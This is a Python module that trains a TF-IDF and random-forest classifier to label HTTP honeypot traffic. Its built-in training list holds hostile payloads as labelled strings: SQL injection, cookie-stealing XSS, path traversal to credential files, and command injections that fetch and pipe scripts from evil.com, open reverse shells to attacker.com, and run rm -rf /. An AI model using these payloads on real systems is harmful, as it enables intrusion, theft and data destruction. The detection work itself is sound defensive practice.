"""
ML Attack Classifier for HTTP Honeypot
---------------------------------------
Uses TF-IDF (character n-grams) + Random Forest to classify HTTP payloads.
Falls back to "Unknown" if model is not trained yet.

Usage:
    from ml_attack_classifier import AttackClassifier
    clf = AttackClassifier()
    label, confidence = clf.predict("' OR 1=1--")
    clf.train()   # call once to train & save model
"""

from __future__ import annotations

import logging
import math
import os
import re

logger = logging.getLogger(__name__)

# ── paths ──────────────────────────────────────────────────────────────────────
_DIR = os.path.dirname(os.path.abspath(__file__))
MODEL_PATH = os.path.join(_DIR, "ml_models", "attack_classifier.pkl")
VECTORIZER_PATH = os.path.join(_DIR, "ml_models", "attack_vectorizer.pkl")

# ── built-in training data ─────────────────────────────────────────────────────
# Covers all attack types the HTTP honeypot already detects + Normal traffic.
# Each tuple is (payload_text, label).
_TRAINING_DATA: list[tuple[str, str]] = [
    # ---------- SQL Injection ----------
    ("' OR '1'='1", "SQLi"),
    ("admin' OR 1=1--", "SQLi"),
    ("' UNION SELECT username,password FROM users--", "SQLi"),
    ("1; DROP TABLE users--", "SQLi"),
    ("' OR 'x'='x", "SQLi"),
    ("username=admin'--&password=x", "SQLi"),
    ("1' AND SLEEP(5)--", "SQLi"),
    ("' AND 1=1 UNION SELECT NULL--", "SQLi"),
    ("UNION SELECT 1,2,3,4--", "SQLi"),
    ("' AND BENCHMARK(1000000,MD5('A'))--", "SQLi"),
    ("SELECT * FROM users WHERE id=1", "SQLi"),
    ("admin'); INSERT INTO users VALUES('hacker','pass')--", "SQLi"),
    ("1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "SQLi"),
    ("' OR 1=1#", "SQLi"),
    ("username=test' AND '1'='1&password=pass", "SQLi"),
    ("1 UNION ALL SELECT NULL,NULL--", "SQLi"),
    ("' HAVING 1=1--", "SQLi"),
    ("ORDER BY 1--", "SQLi"),
    ("' GROUP BY 1--", "SQLi"),
    ("1; EXEC xp_cmdshell('whoami')--", "SQLi"),
    # ---------- XSS ----------
    ("<script>alert('xss')</script>", "XSS"),
    ("<img src=x onerror=alert(1)>", "XSS"),
    ("javascript:alert(document.cookie)", "XSS"),
    ("<svg onload=alert(1)>", "XSS"),
    ("<body onload=alert('xss')>", "XSS"),
    ("'\"><script>alert(1)</script>", "XSS"),
    ("<iframe src=javascript:alert(1)>", "XSS"),
    ("%3Cscript%3Ealert(1)%3C%2Fscript%3E", "XSS"),
    ("<input type=text value=\"<script>alert(1)</script>\">", "XSS"),
    ("data:text/html,<script>alert(1)</script>", "XSS"),
    ("vbscript:msgbox('xss')", "XSS"),
    ("<META HTTP-EQUIV='refresh' CONTENT='0;url=javascript:alert(1)'>", "XSS"),
    ("<object data=javascript:alert(1)>", "XSS"),
    ("<details open ontoggle=alert(1)>", "XSS"),
    ("</script><script>alert(1)</script>", "XSS"),
    # ---------- Path Traversal ----------
    ("../../etc/passwd", "PathTraversal"),
    ("../../../windows/win.ini", "PathTraversal"),
    ("%2e%2e%2fetc%2fpasswd", "PathTraversal"),
    ("....//....//etc/passwd", "PathTraversal"),
    ("/etc/shadow", "PathTraversal"),
    ("../../boot.ini", "PathTraversal"),
    ("%252e%252e%252f", "PathTraversal"),
    ("..%c0%afetc%c0%afpasswd", "PathTraversal"),
    ("/proc/self/environ", "PathTraversal"),
    ("../../../../../../etc/passwd%00", "PathTraversal"),
    ("....\\....\\windows\\win.ini", "PathTraversal"),
    ("%2e%2e/etc/passwd", "PathTraversal"),
    # ---------- Command Injection ----------
    ("; cat /etc/passwd", "CmdInjection"),
    ("| whoami", "CmdInjection"),
    ("&& ls -la", "CmdInjection"),
    ("`id`", "CmdInjection"),
    ("$(wget http://evil.com/malware.sh)", "CmdInjection"),
    ("; nc -e /bin/sh attacker.com 4444", "CmdInjection"),
    ("| curl http://attacker.com/shell.sh | bash", "CmdInjection"),
    ("; python -c 'import os; os.system(\"rm -rf /\")'", "CmdInjection"),
    ("&& rm -rf /tmp/*", "CmdInjection"),
    ("; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "CmdInjection"),
    ("| cat /etc/shadow", "CmdInjection"),
    ("$(curl -s http://evil.com/payload)", "CmdInjection"),
    ("; powershell.exe -exec bypass -c IEX (iwr 'http://evil.com')", "CmdInjection"),
    # ---------- Normal ----------
    ("username=john&password=MySecret123", "Normal"),
    ("GET /index.html HTTP/1.1", "Normal"),
    ("POST /api/login HTTP/1.1\r\nContent-Type: application/json", "Normal"),
    ("user=alice&pass=correcthorsebatterystaple", "Normal"),
    ("search=hello+world", "Normal"),
    ("page=1&limit=20&sort=date", "Normal"),
    ("name=John+Doe&email=john%40example.com", "Normal"),
    ("q=python+programming+tutorial", "Normal"),
    ("id=42&action=view", "Normal"),
    ("token=abc123&redirect=/dashboard", "Normal"),
    ("username=admin&password=admin123", "Normal"),
    ("GET /favicon.ico HTTP/1.1", "Normal"),
    ("GET /robots.txt HTTP/1.1", "Normal"),
    ("Accept: text/html,application/xhtml+xml", "Normal"),
    ("Content-Type: application/x-www-form-urlencoded", "Normal"),
]


class AttackClassifier:
    """Wraps sklearn TF-IDF + Random Forest for HTTP attack classification."""

    def __init__(self) -> None:
        self._model = None
        self._vectorizer = None
        self._ready = False
        os.makedirs(os.path.join(_DIR, "ml_models"), exist_ok=True)
        self._load()

    # ── public API ─────────────────────────────────────────────────────────────

    def predict(self, payload: str) -> tuple[str | None, float]:
        """
        Return (label, confidence) for the given payload string.
        Returns (None, 0.0) if model is not ready or payload is Normal.
        """
        if not self._ready:
            return None, 0.0
        try:
            X = self._vectorizer.transform([payload])
            proba = self._model.predict_proba(X)[0]
            classes = list(self._model.classes_)
            best_idx = int(proba.argmax())
            label = str(classes[best_idx])
            confidence = self._calibrate_confidence(proba, payload)
            if label == "Normal":
                return None, confidence
            return label, confidence
        except Exception as exc:
            logger.error("ML predict error: %s", exc)
            return None, 0.0

    def train(self) -> bool:
        """Train the model on built-in training data and save to disk."""
        try:
            from sklearn.ensemble import RandomForestClassifier
            from sklearn.feature_extraction.text import TfidfVectorizer
            import joblib

            payloads = [d[0] for d in _TRAINING_DATA]
            labels = [d[1] for d in _TRAINING_DATA]

            vectorizer = TfidfVectorizer(
                analyzer="char_wb",
                ngram_range=(2, 4),
                max_features=3000,
                sublinear_tf=True,
            )
            X = vectorizer.fit_transform(payloads)

            clf = RandomForestClassifier(
                n_estimators=200,
                max_depth=None,
                random_state=42,
                class_weight="balanced",
            )
            clf.fit(X, labels)

            joblib.dump(clf, MODEL_PATH)
            joblib.dump(vectorizer, VECTORIZER_PATH)

            self._model = clf
            self._vectorizer = vectorizer
            self._ready = True
            logger.info("AttackClassifier: trained and saved to %s", MODEL_PATH)
            return True
        except ImportError:
            logger.warning("AttackClassifier: scikit-learn / joblib not installed. Run: pip install scikit-learn joblib")
            return False
        except Exception as exc:
            logger.error("AttackClassifier training failed: %s", exc)
            return False

    @property
    def is_ready(self) -> bool:
        return self._ready

    # ── private ────────────────────────────────────────────────────────────────

    def _load(self) -> None:
        if not (os.path.exists(MODEL_PATH) and os.path.exists(VECTORIZER_PATH)):
            logger.info("AttackClassifier: no saved model found — training now...")
            self.train()
            return
        try:
            import joblib
            self._model = joblib.load(MODEL_PATH)
            self._vectorizer = joblib.load(VECTORIZER_PATH)
            self._ready = True
            logger.info("AttackClassifier: loaded from %s", MODEL_PATH)
        except Exception as exc:
            logger.warning("AttackClassifier: could not load model (%s) — retraining", exc)
            self.train()

    @staticmethod
    def _calibrate_confidence(proba: list[float], payload: str) -> float:
        """
        Convert raw class probabilities into a more realistic confidence value.

        Why: tree ensembles can be overconfident on small synthetic datasets.
        We reduce confidence when class separation is weak (small top-2 gap),
        prediction uncertainty is high (entropy), or payload is too short.
        """
        probs = [float(p) for p in proba]
        if not probs:
            return 0.0

        probs_sorted = sorted(probs, reverse=True)
        top1 = probs_sorted[0]
        top2 = probs_sorted[1] if len(probs_sorted) > 1 else 0.0
        margin = max(0.0, min(1.0, top1 - top2))

        n = len(probs)
        eps = 1e-12
        entropy = -sum(p * math.log(max(p, eps)) for p in probs)
        max_entropy = math.log(max(n, 2))
        entropy_norm = entropy / max_entropy if max_entropy > 0 else 0.0

        # Small payloads are less informative for text classifiers.
        length_factor = max(0.55, min(1.0, len(payload) / 40.0))

        # Blend confidence signals and keep calibration conservative.
        calibrated = top1 * (0.65 + 0.35 * margin) * (1.0 - 0.35 * entropy_norm) * length_factor
        return max(0.0, min(1.0, calibrated))
